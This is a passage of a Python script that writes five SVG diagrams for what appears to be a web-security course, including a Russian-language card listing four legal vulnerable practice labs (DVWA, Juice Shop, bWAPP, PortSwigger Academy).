    <text x="25" y="35" font-size="17" font-weight="bold" fill="#58a6ff">🧪 4 УЯЗВИМЫХ СТЕНДА ДЛЯ ЛЕГАЛЬНОЙ ТРЕНИРОВКИ НА СВОЁМ ПК (В DOCKER):</text>

    <rect x="25" y="55" width="260" height="135" rx="10" fill="#0d1117" stroke="#30363d"/>
    <text x="40" y="82" font-size="15" font-weight="bold" fill="#f0883e">1. DVWA</text>
    <text x="40" y="102" font-size="11.5" fill="#8b949e">Damn Vulnerable Web App</text>
    <text x="40" y="124" font-size="12" fill="#c9d1d9">Классика с переключателем</text>
    <text x="40" y="142" font-size="12" fill="#c9d1d9">сложности: Low ➔ Medium ➔</text>
    <text x="40" y="160" font-size="12" fill="#c9d1d9">High ➔ Impossible (код патча).</text>

    <rect x="302" y="55" width="260" height="135" rx="10" fill="#0d1117" stroke="#30363d"/>
    <text x="317" y="82" font-size="15" font-weight="bold" fill="#7ee787">2. OWASP Juice Shop</text>
    <text x="317" y="102" font-size="11.5" fill="#8b949e">Современный интернет-магазин</text>
    <text x="317" y="124" font-size="12" fill="#c9d1d9">Написан на Node.js + Angular.</text>
    <text x="317" y="142" font-size="12" fill="#c9d1d9">Полностью на REST API, JSON</text>
    <text x="317" y="160" font-size="12" fill="#c9d1d9">и JWT-токенах (100+ задач!).</text>

    <rect x="579" y="55" width="260" height="135" rx="10" fill="#0d1117" stroke="#30363d"/>
    <text x="594" y="82" font-size="15" font-weight="bold" fill="#d2a8ff">3. bWAPP</text>
    <text x="594" y="102" font-size="11.5" fill="#8b949e">Buggy Web Application</text>
    <text x="594" y="124" font-size="12" fill="#c9d1d9">Более 100 отдельных видов</text>
    <text x="594" y="142" font-size="12" fill="#c9d1d9">уязвимостей в выпадающем</text>
    <text x="594" y="160" font-size="12" fill="#c9d1d9">списке для точечной отработки.</text>

    <rect x="856" y="55" width="260" height="135" rx="10" fill="#0d1117" stroke="#30363d"/>
    <text x="871" y="82" font-size="15" font-weight="bold" fill="#58a6ff">4. PortSwigger Academy</text>
    <text x="871" y="102" font-size="11.5" fill="#8b949e">Онлайн-полигон №1 в мире</text>
    <text x="871" y="124" font-size="12" fill="#c9d1d9">250+ бесплатных облачных</text>
    <text x="871" y="142" font-size="12" fill="#c9d1d9">лабораторных стендов по всем</text>
    <text x="871" y="160" font-size="12" fill="#c9d1d9">темам веба и API.</text>
  </g>
</svg>"""

files = {
    "browser_security_3_pillars.svg": svg_browser,
    "burp_suite_architecture.svg": svg_burp,
    "web_vulnerabilities_map.svg": svg_vulns,
    "jwt_structure_and_attacks.svg": svg_jwt,
    "recon_automation_pipeline.svg": svg_recon,
}

for fname, content in files.items():
    with open(os.path.join(assets_dir, fname), "w", encoding="utf-8") as f:
        f.write(content)

print("All 5 SVG diagrams generated successfully.")
